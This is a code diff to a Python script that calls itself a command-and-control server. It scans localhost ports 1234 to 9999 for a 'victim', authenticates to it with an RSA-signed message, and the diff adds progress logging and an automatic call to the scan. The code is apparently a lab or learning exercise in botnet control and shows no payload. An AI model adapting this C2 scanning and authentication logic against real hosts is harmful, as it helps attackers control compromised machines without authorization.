@@ -3,7 +3,7 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 import socket
 
-INIT_MESSAGE = "This message will be signed and verified"
+INIT_MESSAGE = b'This message will be signed and verified'
 BASE_PORT = 1234
 VICTIM_IP = '127.0.0.1'
 
@@ -16,7 +16,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 def _authenticate(message = INIT_MESSAGE):
     auth = False
     with open("privkey.pem", "rb") as key_file:
-        priv = serialization.load_pem_priv_key(
+        priv = serialization.load_pem_private_key(
             key_file.read(),
             password=None,
         )
@@ -47,7 +47,13 @@ def find_victim(host = VICTIM_IP, port = BASE_PORT):
     while port < 9999:
         ok = _connect(host, port)
         if ok:
+            print(f"[CNCServer] Connected and trying port {port}.")
             ok = _authenticate()
-        if ok:
-            break
+            if ok:
+                print(f"[CNCServer] Authenticated succeeded port {port}.")
+                break
+            else:
+                print(f"[CNCServer] Authenticated failed port {port}.")
         port += 1
+
+find_victim()
